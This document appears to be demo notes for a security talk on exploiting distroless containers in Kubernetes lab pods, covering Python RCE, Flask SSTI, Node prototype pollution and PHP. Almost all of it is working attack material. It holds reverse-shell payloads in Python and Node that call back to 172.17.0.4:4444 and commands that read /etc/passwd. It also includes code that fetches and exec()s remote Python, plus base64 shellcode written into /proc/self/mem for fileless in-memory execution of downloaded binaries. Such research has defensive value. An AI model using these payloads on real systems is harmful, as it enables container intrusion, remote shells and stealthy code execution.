# Demo 0: What is distroless
## No sh
kubectl exec -it dless-express-pp-pod -- sh

## No binaries
kubectl exec -it dless-flask-ssti-pod -- sh
ls
command -v openssl #https://www.form3.tech/engineering/content/exploiting-distroless-images








# Demo 1: Python RCE
kubectl port-forward dless-flask-ssti-pod 3002:8080

## No binaries
http://localhost:3001/?cmd=ls
http://localhost:3001/?cmd=whoami
http://localhost:3001/?cmd=dd
http://localhost:3001/?cmd=which sh

## Show sh builtins
http://127.0.0.1:3001/?cmd=while read -r line; do echo $line; done</etc/passwd
http://localhost:3001/?cmd=command -v python

## Run using python
http://127.0.0.1:3001/?cmd=python -c "exec('import platform\nprint(platform.uname())')"

## Get reverse shell

http://127.0.0.1:3001/?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.4",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/usr/bin/python","-i"]);'

## Execute binary using syscall
wget https://storage.googleapis.com/kubernetes-release/release/v1.25.3/bin/linux/arm64/kubectl
python3 fee.py kubectl > /tmp/kubectl.py
python3 /tmp/kubectl.py

### Fix code

```python
# imports ...
pid = os.fork()
if pid == 0: #pid==0 represents the child process
# Rest of the payload inside this if
```

### Download & execute ls.py in victim
```python
from urllib import request
kubectl = request.urlopen("http://172.17.0.4:8000/kubectl.py").read()
exec(kubectl)
```


# Demo 1.5: Python SSTI
kubectl port-forward dless-flask-ssti-pod 3002:1337

## If no sh, and not RCE but SSTI, this is still possible with raw python
http://127.0.0.1:3002/?name={{(1).__class__.__base__.__subclasses__()[216]()._module.__builtins__["open"]("/etc/passwd").read()}}










# Demo 2: Node PP
kubectl port-forward dless-express-pp-pod 3000:3000

## Reverse-shell
http://127.0.0.1:3000/?exec=1&data={"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\"child_process\").fork(\"-e\",[\"net=require(`net`);cp=require(`child_process`);sh=cp.spawn(`/proc/self/exe`, [`-i`], {detached: true});client = new net.Socket();client.connect(4444, `172.17.0.4`, function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});//\"],{\"env\":{\"NODE_OPTIONS\":\"\"}}).toString())//"}}}

## Info
```js
os = require("os")
os.tmpdir()
os.platform();
os.release();
os.arch();
os.networkInterfaces()
```

## List folder
```js
path = require('path');
fs = require('fs');

function ls(path){
    fs.readdir(path, { withFileTypes: true }, function (err, files) {
        if (err) {
            return console.log('Unable to scan directory: ' + err);
        } 
        files.forEach(function (file) {
            console.log(file); 
        });
    });
}

ls("/")
```

## In memory execution

```js
// Imports
fs = require('fs');
path = require('path');
http = require('http');
https = require('https');
const { fork } = require('child_process');

// Code to execute a fork process taht will execute a shellcode with memfd_create
node_subp1_path = "/dev/shm/subp1.js"

// memfd_create shellcode from https://github.com/arget13/DDexec (this is the one for ARM)
var node_subp1 = `
fs = require('fs');
var data = fs.readFileSync('/proc/self/syscall', {encoding:'utf8', flag:'r'});
var mem_addr = data.split(" ")[8].trim();
var dec_offset = Number(mem_addr);
var shellcode_b64 = "gCiI0qCIqPLgDx/44AMAkSEAAcroIoDSAQAA1MgFgNIBAADUiBWA0gEAANRhAoDSKBCA0gEAANQ=";
var shellcode = Buffer.from(shellcode_b64, 'base64');
fs.open('/proc/self/mem', 'a', function(err, fd) {
    fs.write(fd, shellcode, 0, shellcode.length, dec_offset, function(err,writtenbytes){});
})
`

fs.writeFileSync(node_subp1_path, node_subp1);

// Check file was created (this step can be skipped)
function ls(path){
    fs.readdir(path, { withFileTypes: true }, function (err, files) {
        if (err) {
            return console.log('Unable to scan directory: ' + err);
        } 
        files.forEach(function (file) {
            console.log(file); 
        });
    });
}

ls("/dev/shm")

// Make a subprocess execute the memfd_create shellcode
var proc = fork(node_subp1_path, [], {"execPath": "/proc/self/exe", "argv0": "nodejs"});

console.log(`Check in /proc/${proc.pid}/fd (memfd is probably the biggest number)`);

// Find the memfd fd
function get_memfd_num(path){
    fs.readdir(path, function (err, files) {
        if (err) {
            console.log('Unable to scan directory: ' + err);
        } 
        files.forEach(function (file) {
            fs.readlink(path + "/" + file, (err, target) => {
                if (!err){
                    if (target.includes("/memfd:"))
                        console.log(path + "/" + file + " -> " + target)
                }
            });
        });
    });
}
get_memfd_num(`/proc/${proc.pid}/fd`);

// Download the binary to execute in the fd
var download = function(url, dest) {
  var file = fs.createWriteStream(dest);
  var request = https.get(url, function(response) {
    response.pipe(file);
    file.on('finish', function() {
        console.log("closed")
        file.close();
    });
  });
};

// CHANGE THE FD: /proc/80/fd/20
download("https://storage.googleapis.com/kubernetes-release/release/v1.25.3/bin/linux/arm64/kubectl", "/proc/80/fd/20")

// Execute the fd directly from the exec syscall
fork("", [], {"execPath": "/proc/80/fd/20", "execArgv": []})
```



# DEMO 3: PHP
docker run -it --rm cgr.dev/chainguard/php -a

## No way to execute binaries from php
```php
`ls`;
`sh`;
```

## List folders & read files

```php
function listFilesInFolder($folderPath) {
  if (is_dir($folderPath)) {
    if ($dh = opendir($folderPath)) {
      while (($file = readdir($dh)) !== false) {
        echo "filename: $file : filetype: " . filetype($folderPath . $file) . "\n";
      }
      closedir($dh);
    }
  }
}
listFilesInFolder("/");
echo file_get_contents("/etc/passwd");
```

## RCE

```php
# Execute binary

$cmd_array = [
    'php',
    '-a'
];

$descriptorspec = array(
    0 => array("pipe", "r"),   // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),   // stdout is a pipe that the child will write to
    2 => array("pipe", "w")    // stderr is a pipe that the child will write to
);

# The only wy in PHP to execute a binary without using a shell is using an array in proc_open
$process = proc_open($cmd_array,$descriptorspec,$pipes);
$status = proc_get_status($process);
$pid = $status['pid'];

# Execute shellcode in child process
$payload = "\n\n".'$data = file_get_contents("/proc/self/syscall"); $data_array = explode(" ", $data); $mem_addr = trim($data_array[8]); $dec_offset = hexdec($mem_addr); $shellcode_b64 = "gCiI0qCIqPLgDx/44AMAkSEAAcroIoDSAQAA1MgFgNIBAADUiBWA0gEAANRhAoDSKBCA0gEAANQ="; $shellcode = base64_decode($shellcode_b64); $fd = fopen("/proc/self/mem", "r+"); fseek($fd,$dec_offset); fwrite($fd, $shellcode); fclose($fd);'."\n\n";

fwrite($pipes[0], $payload);

sleep(0.5);

# Check it was created
function listFilesInFolder($folderPath) {
  if (is_dir($folderPath)) {
    if ($dh = opendir($folderPath)) {
      while (($file = readdir($dh)) !== false) {
        echo "filename: $file : filetype: " . filetype($folderPath . $file) . "\n";
      }
      closedir($dh);
    }
  }
}

listFilesInFolder("/proc/$pid/fd/");

# Load kubectl in memfd (NOT WORKING)
file_put_contents("/proc/$pid/fd/3", file_get_contents("https://storage.googleapis.com/kubernetes-release/release/v1.25.3/bin/linux/arm64/kubectl"));

# Execute kubectl
$cmd_array_kubectl = [
    "/proc/$pid/fd/3",
    '-h'
];

$descriptorspec_kubectl = array(
    0 => array("pipe", "r"),   // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),   // stdout is a pipe that the child will write to
    2 => array("pipe", "w")    // stderr is a pipe that the child will write to
);

$process2 = proc_open($cmd_array_kubectl,$descriptorspec_kubectl,$pipes_kubectl);
sleep(0.5);
echo stream_get_contents($pipes_kubectl[1]);
proc_close($process2);
```